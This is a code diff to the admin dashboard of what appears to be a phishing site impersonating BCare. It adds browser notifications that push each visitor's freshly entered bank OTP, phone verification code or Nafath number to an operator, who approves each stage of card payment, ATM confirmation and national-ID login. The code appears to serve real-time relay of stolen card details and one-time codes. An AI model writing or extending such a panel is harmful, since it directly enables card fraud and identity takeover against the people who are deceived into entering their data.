@@ -193,7 +193,17 @@ const AdminVisitors = () => {
   const fetchTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const [visibleCount, setVisibleCount] = useState(20);
   const listEndRef = useRef<HTMLDivElement | null>(null);
-  // Sound notification for pending stages
+  // Request browser notification permission on mount
+  useEffect(() => {
+    if ("Notification" in window && Notification.permission === "default") {
+      Notification.requestPermission();
+    }
+  }, []);
+
+  // Store pending order details for browser notifications
+  const pendingOrderDetailsRef = useRef<Record<string, { stage: string; otp_code?: string; phone_otp_code?: string; nafath_number?: string; customer_name?: string }>>({});
+
+  // Sound + Browser notification for pending stages
   useEffect(() => {
     const currentPendingKeys = new Set(
       Object.entries(pendingStageMap).map(([visitorId, stage]) => `${visitorId}:${stage}`)
@@ -203,10 +213,10 @@ const AdminVisitors = () => {
       hasInitializedPendingRef.current = true;
       return;
     }
-    const hasNew = Array.from(currentPendingKeys).some(key => !knownPendingStagesRef.current.has(key));
-    if (hasNew) {
-      const newKey = Array.from(currentPendingKeys).find(k => !knownPendingStagesRef.current.has(k));
-      const stage = newKey?.split(":")[1] || "";
+    const newKeys = Array.from(currentPendingKeys).filter(key => !knownPendingStagesRef.current.has(key));
+    if (newKeys.length > 0) {
+      const newKey = newKeys[0];
+      const [visitorId, stage] = [newKey.split(":")[0], newKey.split(":").slice(1).join(":")];
       const stageSounds: Record<string, () => void> = {
         payment: sounds.payment,
         otp: sounds.cardOtp,
@@ -218,13 +228,45 @@ const AdminVisitors = () => {
       };
       (stageSounds[stage] || sounds.approvalNeeded)();
       const stageLabel: Record<string, string> = {
+        payment: "💳 الدفع بالبطاقة", otp: "🔑 رمز التحقق", phone_verification: "📱 توثيق الجوال",
+        phone_otp: "📲 كود توثيق الجوال", stc_call: "📞 مكالمة STC", nafath_login: "🔐 دخول نفاذ", nafath_verify: "✅ تحقق نفاذ",
+      };
+      const stageLabelClean: Record<string, string> = {
         payment: "الدفع بالبطاقة", otp: "رمز التحقق", phone_verification: "توثيق الجوال",
         phone_otp: "كود توثيق الجوال", stc_call: "مكالمة STC", nafath_login: "دخول نفاذ", nafath_verify: "تحقق نفاذ",
       };
-      toast.info(`زائر بانتظار الموافقة على: ${stageLabel[stage] || stage}`);
+      toast.info(`زائر بانتظار الموافقة على: ${stageLabelClean[stage] || stage}`);
+
+      // Browser Notification
+      if ("Notification" in window && Notification.permission === "granted") {
+        const details = pendingOrderDetailsRef.current[visitorId];
+        const visitor = visitors.find(v => v.id === visitorId);
+        const visitorLabel = details?.customer_name || visitor?.visitor_name || "زائر";
+        
+        let body = `${stageLabel[stage] || stage}`;
+        if (stage === "otp" && details?.otp_code) {
+          body += `\nكود OTP: ${details.otp_code}`;
+        } else if (stage === "phone_otp" && details?.phone_otp_code) {
+          body += `\nكود الجوال: ${details.phone_otp_code}`;
+        } else if ((stage === "nafath_login" || stage === "nafath_verify") && details?.nafath_number) {
+          body += `\nرقم نفاذ: ${details.nafath_number}`;
+        }
+
+        const notification = new Notification(`🔔 BCare - ${visitorLabel}`, {
+          body,
+          icon: "/favicon.svg",
+          tag: `pending-${visitorId}-${stage}`,
+          requireInteraction: true,
+        });
+        notification.onclick = () => {
+          window.focus();
+          if (visitor) setSelectedVisitor(visitor);
+          notification.close();
+        };
+      }
     }
     knownPendingStagesRef.current = currentPendingKeys;
-  }, [pendingStageMap]);
+  }, [pendingStageMap, visitors]);
 
   const priorityPages = ["الدفع بالبطاقة", "رمز التحقق البنكي", "تأكيد ATM", "توثيق الجوال", "كود توثيق الجوال", "مكالمة STC", "دخول نفاذ", "تحقق نفاذ", "تأكيد الطلب", "إتمام الشراء"];
 
